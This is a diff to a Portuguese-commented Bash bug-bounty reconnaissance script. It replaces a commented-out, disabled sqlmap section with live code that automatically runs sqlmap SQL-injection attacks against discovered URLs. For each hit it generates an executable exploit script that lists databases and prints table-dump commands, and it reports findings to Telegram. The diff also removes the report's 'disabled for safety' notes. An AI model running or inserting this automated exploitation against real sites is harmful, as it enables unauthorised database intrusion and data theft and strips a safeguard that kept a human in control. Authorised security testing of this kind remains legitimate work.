@@ -774,20 +774,118 @@ Iniciando varredura de vulnerabilidades..."
     
     xss_testing
     
-    # COMENTADO: SQLMap testing (ativar apenas com muito cuidado)
-    # AVISO: Descomente apenas se tiver autorização completa
-    # sqlmap_testing() {
-    #     if command -v sqlmap >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
-    #         log_info "AVISO: SQLMap testing está desabilitado por segurança"
-    #         log_info "Para ativar, descomente a função sqlmap_testing"
-    #         # timeout 10m cat urls/with_params.txt | head -5 | while read url; do
-    #         #     timeout 120s sqlmap -u "$url" --batch --level=1 --risk=1 \
-    #         #       --random-agent --threads=1 --technique=B \
-    #         #       --no-cast --disable-coloring --timeout=30 \
-    #         #       --output-dir="poc/sqli" 2>/dev/null || true
-    #         # done
-    #     fi
-    # }
+    # ============= SQLMAP TESTING HABILITADO COM CONTROLES DE SEGURANÇA =============
+    sqlmap_testing() {
+        if command -v sqlmap >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
+            log_info "Iniciando SQLMap testing com controles de segurança..."
+            send_telegram_status "💉 *SQL INJECTION TESTING*
+Testando $PARAM_URLS URLs para SQLi..."
+            
+            mkdir -p poc/sqli logs/sqlmap
+            
+            # Preparar candidatos SQLi
+            if command -v gf >/dev/null 2>&1; then
+                cat urls/with_params.txt | gf sqli 2>/dev/null > urls/sqli_candidates.txt || true
+            else
+                # Fallback: regex patterns para parâmetros suspeitos
+                grep -Ei "(\?|&)(id|user|search|category|page|item|product)=" urls/with_params.txt > urls/sqli_candidates.txt 2>/dev/null || true
+            fi
+            
+            # Se não encontrou candidatos, usar algumas URLs com parâmetros
+            if [[ ! -s urls/sqli_candidates.txt ]]; then
+                head -10 urls/with_params.txt > urls/sqli_candidates.txt
+            fi
+            
+            local candidates=$(safe_count urls/sqli_candidates.txt)
+            log_info "Testando $candidates candidatos SQLi com sqlmap..."
+            
+            # Limite seguro de URLs para testar
+            local max_urls=10
+            [[ "$PROFILE" = "light" ]] && max_urls=5
+            [[ "$PROFILE" = "aggressive" ]] && max_urls=20
+            
+            local current=0
+            > urls/sqli_validated.txt
+            
+            head -n "$max_urls" urls/sqli_candidates.txt | while read -r url && [[ $current -lt $max_urls ]]; do
+                current=$((current + 1))
+                log_info "[SQLMap $current/$max_urls] Testando: $url"
+                
+                # Hash para nome de arquivo único
+                local url_hash=$(echo "$url" | md5sum | cut -c1-8)
+                local log_file="logs/sqlmap/sqlmap_${url_hash}.txt"
+                
+                # SQLMap com parâmetros seguros
+                timeout 120s sqlmap \
+                    -u "$url" \
+                    --batch --level=1 --risk=1 \
+                    --random-agent --threads=1 \
+                    --technique=BEUST \
+                    --no-cast --disable-coloring \
+                    --answers="follow=N,other=N,crack=N,dict=N,keep=Y" \
+                    --timeout=30 --retries=1 \
+                    --output-dir="poc/sqli" \
+                    > "$log_file" 2>&1 || {
+                        echo "[TIMEOUT/ERROR] $url" >> logs/sqlmap/errors.log
+                        continue
+                    }
+                
+                # Verificar se encontrou vulnerabilidade
+                if grep -qi "parameter.*is vulnerable\|sqlmap identified the following injection point\|payload.*worked" "$log_file"; then
+                    echo "$url" >> urls/sqli_validated.txt
+                    log_info "⚠️  VULNERABILIDADE SQLi ENCONTRADA: $url"
+                    
+                    # Alertar no Telegram se configurado
+                    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
+                        send_telegram_message_enhanced "🚨 *SQL INJECTION FOUND!*
+💉 URL: \`$url\`
+🔍 Verificar: poc/sqli/ e logs/sqlmap/" "true"
+                    fi
+                    
+                    # Criar PoC de exploit
+                    cat > "poc/sqli/exploit_${url_hash}.sh" <<-SQLPOC
+#!/bin/bash
+# SQLi exploit para: $url
+# Encontrada em: $(date)
+
+echo "=== SQLi Exploitation PoC ==="
+echo "Target: $url"
+echo ""
+
+echo "1. Listando databases:"
+sqlmap -u "$url" --batch --dbs --threads=2
+
+echo ""
+echo "2. Para dump de tabelas específicas:"
+echo "sqlmap -u '$url' --batch -D DATABASE_NAME --tables"
+
+echo ""
+echo "3. CUIDADO: Dump completo (apenas com autorização):"
+echo "sqlmap -u '$url' --batch --dump --threads=2"
+SQLPOC
+                    chmod +x "poc/sqli/exploit_${url_hash}.sh"
+                fi
+            done
+            
+            local sqli_found=$(safe_count urls/sqli_validated.txt)
+            log_info "SQLMap testing completo. Vulnerabilidades encontradas: $sqli_found"
+            
+            if [[ "$sqli_found" -gt 0 ]]; then
+                send_telegram_status "🚨 *SQLi VULNERABILITIES CONFIRMED*
+💥 $sqli_found SQL injections encontradas!
+📁 PoCs gerados em poc/sqli/
+⚠️ REVISÃO MANUAL URGENTE!" true
+            else
+                send_telegram_status "✅ *SQLi TESTING COMPLETE*
+🛡️ Nenhuma vulnerabilidade SQLi confirmada nos candidatos testados"
+            fi
+        else
+            log_info "SQLMap não disponível ou nenhuma URL com parâmetros encontrada"
+            touch urls/sqli_candidates.txt urls/sqli_validated.txt
+        fi
+    }
+    
+    sqlmap_testing
     
 else
     log_info "DRY-RUN: Pulando vulnerability scanning"
@@ -892,6 +990,7 @@ NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
 NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
 NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
 DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
+SQLI_VALIDATED=$(safe_count urls/sqli_validated.txt)
 
 # Criar resumo de vulnerabilidades
 cat > reports/vuln_summary.txt <<-VSUMMARY
@@ -900,6 +999,7 @@ VULNERABILITY SUMMARY - $(date -u)
 
 🔥 CRITICAL FINDINGS:
 - Nuclei Critical: $NUCLEI_FAST_TOTAL  
+- SQLi Confirmed: $SQLI_VALIDATED
 - Exposed Secrets: $TOTAL_SECRETS
 - XSS Findings: $DALFOX_RESULTS
 
@@ -958,9 +1058,10 @@ Profile: **$PROFILE** | Mode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || e
 ## ⚡ Potential Vulnerabilities
 
 ### SQL Injection
-- **Candidates**: $SQLI_CANDIDATES endpoints
-- **Manual Testing**: Review \`urls/gf_sqli.txt\`
-- **Note**: SQLMap testing disabled for safety - enable manually if authorized
+- **Candidates**: $SQLI_CANDIDATES endpoints  
+- **Confirmed**: $(safe_count urls/sqli_validated.txt) vulnerabilities
+- **Details**: See \`urls/gf_sqli.txt\` and \`poc/sqli/\`
+- **Note**: SQLMap testing enabled with safety controls
 
 ### Other Vulnerabilities
 - **LFI Candidates**: $LFI_CANDIDATES
@@ -1004,8 +1105,9 @@ Profile: **$PROFILE** | Mode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || e
 1. **Immediate**: Review critical Nuclei findings in \`nuclei/nuclei_*_fast.txt\`
 2. **High Priority**: Validate XSS findings from Dalfox
 3. **Medium Priority**: Review secrets in \`secrets/\` for sensitive exposure
-4. **Manual Testing**: SQLi candidates in \`urls/gf_sqli.txt\` (enable SQLMap carefully)
-5. **Ongoing**: Monitor misconfigurations from extended Nuclei scan
+4. **Validated SQLi**: Check confirmed SQLi in \`urls/sqli_validated.txt\` and \`poc/sqli/\`
+5. **Manual Testing**: Additional SQLi candidates in \`urls/gf_sqli.txt\`
+6. **Ongoing**: Monitor misconfigurations from extended Nuclei scan
 
 ## ⚙️ Configuration Used
 - **Profile**: $PROFILE
@@ -1019,7 +1121,7 @@ Profile: **$PROFILE** | Mode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || e
 - Profile-based resource management for safe operation
 - DRY-RUN mode enabled by default for safety
 - Active scanning requires explicit --confirm flag
-- SQLMap testing disabled by default (uncomment carefully)
+- SQLMap testing enabled with level=1, risk=1 safety controls
 - All timeouts and rate limits configured per profile
 - Scope validation and wildcard handling implemented
 - Manual verification required before reporting findings
@@ -1111,6 +1213,10 @@ cat > "$HTML" <<-HTMLDOC
       <div class="metric-label">Nuclei Critical</div>
     </div>
     <div class="metric critical">
+      <div class="metric-value">$SQLI_VALIDATED</div>
+      <div class="metric-label">SQLi Confirmed</div>
+    </div>
+    <div class="metric critical">
       <div class="metric-value">$DALFOX_RESULTS</div>
       <div class="metric-label">XSS Confirmed</div>
     </div>
@@ -1177,8 +1283,10 @@ cat > "$HTML" <<-HTMLDOC
         <ul>
           <li><a href="../nuclei/">🎯 Nuclei Results</a></li>
           <li><a href="../secrets/">🔑 Secrets Directory</a></li>
+          <li><a href="../urls/sqli_validated.txt">💉 SQLi Confirmed</a></li>
           <li><a href="../urls/gf_xss.txt">❌ XSS Candidates</a></li>
           <li><a href="../urls/gf_sqli.txt">💉 SQLi Candidates</a></li>
+          <li><a href="../poc/sqli/">📁 SQLi PoCs</a></li>
         </ul>
       </div>
       
@@ -1259,7 +1367,7 @@ final_telegram_report() {
         log_info "Enviando relatório final para Telegram..."
         
         # Determinar nível de alerta
-        if [[ "$NUCLEI_FAST_TOTAL" -gt 5 ]] || [[ "$DALFOX_RESULTS" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 10 ]]; then
+        if [[ "$NUCLEI_FAST_TOTAL" -gt 5 ]] || [[ "$DALFOX_RESULTS" -gt 0 ]] || [[ "$SQLI_VALIDATED" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 10 ]]; then
             ALERT="🔴 *HIGH RISK*"
         elif [[ "$NUCLEI_FAST_TOTAL" -gt 0 ]] || [[ "$TOTAL_SECRETS" -gt 0 ]]; then
             ALERT="🟡 *MEDIUM RISK*"  
@@ -1282,8 +1390,9 @@ final_telegram_report() {
 
 *🔥 Critical Findings:*  
 - ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL  
+- 💉 SQLi confirmada: $SQLI_VALIDATED
 - ❌ XSS confirmado: $DALFOX_RESULTS
-- 🔑 Secrets expostos: $TOTAL_SECRETS  
+- 🔑 Secrets expostos: $TOTAL_SECRETS
 
 *⚡ Vulnerability Candidates:*  
 - ❌ XSS candidatos: $XSS_CANDIDATES  
@@ -1349,6 +1458,7 @@ echo "   🔌 APIs encontradas: $API_ENDPOINTS"
 echo ""
 echo "🔥 VULNERABILIDADES:"
 echo "   ⚡ Nuclei crítico: $NUCLEI_FAST_TOTAL"
+echo "   💉 SQLi confirmada: $SQLI_VALIDATED"
 echo "   ❌ XSS confirmado: $DALFOX_RESULTS"
 echo "   🔑 Secrets expostos: $TOTAL_SECRETS"
 echo ""
